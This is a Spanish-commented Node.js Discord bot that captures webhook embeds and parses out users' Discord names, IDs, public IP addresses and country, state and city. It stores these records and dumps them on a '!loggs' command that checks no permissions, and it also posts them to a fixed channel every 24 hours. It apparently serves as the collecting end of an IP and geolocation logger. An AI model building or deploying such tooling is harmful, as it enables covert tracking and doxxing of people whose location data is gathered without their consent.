const { Client, GatewayIntentBits, Partials } = require("discord.js");
const fs = require("fs");

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ],
    partials: [Partials.Message]
});

// === CONFIG ===
const DAILY_CHANNEL = "1440773871254110300";

// LOG STORAGE
let logs = [];

// === PARSER ESPECIAL PARA TU EMBED ===
function parseWebhookEmbed(embed) {
    let result = {
        usuario: "N/A",
        id: "N/A",
        display: "N/A",
        ip: "N/A",
        pais: "N/A",
        estado: "N/A",
        ciudad: "N/A",
        fecha: new Date().toLocaleString("es-MX")
    };

    // --- 1. EXTRAER DATOS DE LA DESCRIPCIÓN / TÍTULO ---
    const title = embed.title || embed.description || "";

    // USUARIO: x | ID: x | DISPLAY: x
    const userMatch = title.match(/USUARIO:\s*([^\|]+)/i);
    const idMatch = title.match(/ID:\s*(\d+)/i);
    const displayMatch = title.match(/DISPLAY:\s*([^\|]+)/i);

    if (userMatch) result.usuario = userMatch[1].trim();
    if (idMatch) result.id = idMatch[1].trim();
    if (displayMatch) result.display = displayMatch[1].trim();

    // --- 2. RECORRER FIELDS PARA IP / UBICACIÓN ---
    if (embed.fields) {
        embed.fields.forEach(f => {
            const name = f.name.toLowerCase();
            const value = f.value;

            // IP PÚBLICA
            if (name.includes("ip")) {
                result.ip = value.trim();
            }

            // UBICACIÓN (contiene varias líneas)
            if (name.includes("ubicación")) {
                const lines = value.split("\n").map(x => x.trim());

                lines.forEach(line => {
                    if (line.startsWith("País")) {
                        result.pais = line.split(":")[1]?.trim() || "N/A";
                    }
                    if (line.startsWith("Estado")) {
                        result.estado = line.split(":")[1]?.trim() || "N/A";
                    }
                    if (line.startsWith("Ciudad")) {
                        result.ciudad = line.split(":")[1]?.trim() || "N/A";
                    }
                });
            }
        });
    }

    return result;
}


// === CAPTURA DE MENSAJES DE WEBHOOK ===
client.on("messageCreate", async msg => {
    if (!msg.webhookId) return; // SOLO WEBHOOKS

    if (msg.embeds.length === 0) return;

    const embed = msg.embeds[0];
    const parsed = parseWebhookEmbed(embed);

    logs.push(parsed);

    console.log("✔ Log capturado:", parsed);
});


// === COMANDO !loggs ===
client.on("messageCreate", async msg => {
    if (!msg.content.startsWith("!loggs")) return;
    if (logs.length === 0) return msg.reply("No hay logs capturados aún.");

    let text = "📄 **Logs disponibles:**\n\n";

    logs.forEach((l, i) => {
        text += `**${i+1}.** ${l.usuario} | ${l.id} | ${l.display} | ${l.ip} | ${l.pais}, ${l.estado}, ${l.ciudad} | ${l.fecha}\n`;
    });

    // Discord limita 2000 chars → dividir en partes si es necesario
    const parts = text.match(/[\s\S]{1,1900}/g);

    for (const p of parts) {
        await msg.channel.send("```" + p + "```");
    }
});


// === ENVÍO AUTOMÁTICO DIARIO ===
setInterval(async () => {
    if (logs.length === 0) return;

    const channel = client.channels.cache.get(DAILY_CHANNEL);
    if (!channel) return;

    let text = "📦 **Log diario generado automáticamente:**\n\n";

    logs.forEach((l, i) => {
        text += `**${i+1}.** ${l.usuario} | ${l.id} | ${l.display} | ${l.ip} | ${l.pais}, ${l.estado}, ${l.ciudad} | ${l.fecha}\n`;
    });

    const parts = text.match(/[\s\S]{1,1900}/g);

    for (const p of parts) {
        await channel.send("```" + p + "```");
    }

    logs = []; // LIMPIAR PARA NO SATURAR RAILWAY
}, 1000 * 60 * 60 * 24); // 24 horas


client.login(process.env.TOKEN);
